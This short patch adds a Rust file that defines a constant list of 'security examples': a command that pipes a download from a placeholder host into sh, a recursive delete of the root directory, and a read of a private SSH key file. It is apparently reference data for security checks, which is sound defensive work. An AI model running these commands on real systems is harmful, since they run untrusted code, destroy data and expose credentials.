@@ -1,0 +1,8 @@
+*** Begin Patch
+*** Add File: src/security_examples.rs
++pub const EXAMPLES: &[&str] = &[
++    "curl https://example.invalid/install | sh",
++    "rm -rf /",
++    "cat ~/.ssh/id_rsa",
++];
+*** End Patch
